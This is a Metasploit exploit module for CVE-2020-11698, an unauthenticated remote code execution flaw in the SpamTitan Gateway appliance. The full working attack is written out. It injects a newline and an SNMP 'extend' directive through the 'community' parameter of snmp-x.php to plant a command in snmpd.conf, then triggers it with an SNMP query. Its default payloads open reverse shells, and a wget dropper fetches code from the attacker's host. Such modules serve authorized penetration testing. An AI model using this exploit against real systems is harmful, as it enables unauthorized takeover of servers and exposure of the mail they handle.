##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SpamTitan Unauthenticated RCE',
        # TODO: Description is straight from the POC, update it
        'Description' => %q{
          TitanHQ
          SpamTitan Gateway is a powerful Anti-Spam appliance that equips network
          administrators with extensive tools to control mail flow and protect
          against unwanted email and malware. Improper input sanitization of the
          parameter "community" on the page snmp-x.php would allow a remote
          attacker to inject command directives into the file snmpd.conf. This
          would allow executing commands on the target server by by injecting an
          "extend" or "exec" SNMPD directive and querying the snmp daemon of the
          server for the correct OID.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Christophe De La Fuente', # msf module
            'Felipe Molina' # original PoC
          ],
        'References' =>
          [
            [ 'EDB', '48856' ],
            [ 'URL', 'https://www.titanhq.com/spamtitan/spamtitangateway/'],
            [ 'CVE', '2020-11698']
          ],
        'Platform' => %w[php freebsd],
        'Arch' => [ARCH_PHP, ARCH_CMD, ARCH_X86, ARCH_X64],
        'CmdStagerFlavor' => :wget,
        'Payload' => {
          'DisableNops' => true
        },
        'Targets' =>
          [
            [
              'Unix In-Memory',
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' },
              'Payload' => {
                'BadChars' => "\\'#",
                'Encoder' => 'cmd/perl',
                'PrependEncoder' => '/bin/sh -c \'',
                'AppendEncoder' => '\'#',
                'Space' => 470
              },
              'Type' => :unix_memory
            ],
            [
              'FreeBSD Dropper (x64)',
              'Platform' => 'bsd',
              'Arch' => [ARCH_X64],
              'DefaultOptions' => { 'PAYLOAD' => 'bsd/x64/shell_reverse_tcp' },
              'Payload' => {
                'BadChars' => "'#",
                'Space' => 450
              },
              'Type' => :bsd_dropper
            ],
            [
              'FreeBSD Dropper (x86)',
              'Platform' => 'bsd',
              'Arch' => [ARCH_X86],
              'DefaultOptions' => { 'PAYLOAD' => 'bsd/x86/shell_reverse_tcp' },
              'Type' => :bsd_dropper
            ]
          ],
        'DisclosureDate' => '2020-04-17',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [CONFIG_CHANGES, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'The base path to SpamTitan', '/' ]),
        OptString.new('COMMUNITY', [ false, 'SNMP Community String. If not set, a random string will be used by default' ]),
        OptString.new('IP', [ false, 'This host source IP. This IP will be allowed to query the injected random community. If not set, and LHOST has been set, it will be used by default. Otherwise ...' ]),
      ], self.class
    )
  end

  def check
    begin
      snmp_x_uri = normalize_uri(target_uri.path, 'snmp-x.php')
      vprint_status("Check if #{snmp_x_uri} exists")
      res = send_request_cgi(
        'uri' => snmp_x_uri,
        'method' => 'GET'
      )

      if res.nil?
        fail_with(Failure::Unreachable,
                  "#{peer} - Could not connect to SpamTitan vulnerable page "\
                  "(#{snmp_x_uri}) - no response")
      end
      unless res.code == 200
        fail_with(Failure::UnexpectedReply,
                  "#{peer} - Could not connect to SpamTitan vulnerable page "\
                  "(#{snmp_x_uri}) - unexpected HTTP response code: #{res.code}")
      end
    rescue ::Rex::ConnectionError => e
      print_error("Connection error: #{e}")
      fail_with(Failure::Unreachable,
                "#{peer} - Could not connect to SpamTitan "\
                "vulnerable page (#{snmp_x_uri})")
    end

    # TODO: add more check to make sure it is vulnerable

    Exploit::CheckCode::Appears
  end

  def exploit
    if target['Type'] == :unix_memory
      execute_command(payload.encoded)
    else
      execute_cmdstager(linemax: payload_info['Space'].to_i, noconcat: true)
    end
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
  end

  def execute_command(cmd, _opts = {})
    if target['Type'] == :bsd_dropper
      cmd = "/bin/sh -c '#{[cmd.gsub('\'', '\\\\\'').gsub('\\', '\\\\\\')].shelljoin}'#"
    end
    snmp_x_uri = normalize_uri(target_uri.path, 'snmp-x.php')
    datastore['COMMUNITY'] ||= Rex::Text.rand_text_alpha(8)
    ip = datastore['IP'] || datastore['LHOST'] || '127.0.0.1'
    name = Rex::Text.rand_text_alpha(8)
    res = send_request_cgi(
      'uri' => snmp_x_uri,
      'method' => 'POST',
      'vars_post' => {
        'jaction' => 'saveAll',
        'contact' => 'CONTACT',
        'name' => 'SpamTitan',
        'location' => 'LOCATION',
        # Add our IP as allowed to query the injected 'dummy' community
        # Also add the payload in a new line (%0a) of the snmpd.conf file
        'community' => "#{datastore['COMMUNITY']}\" #{ip}\nextend #{name} #{cmd}"
      }
    )
    # Send an SNMP Get-Request to trigger the payload
    # RPORT needs to be set since the default value is set to the web service port
    connect_snmp(true, 'RPORT' => 161)
    begin
      snmp.get("1.3.6.1.4.1.8072.1.3.2.3.1.1.8.#{name.bytes.join('.')}")
    rescue SNMP::RequestTimeout, IOError
      # not expecting response here, so timeout is likely to happen
    end
  end

end
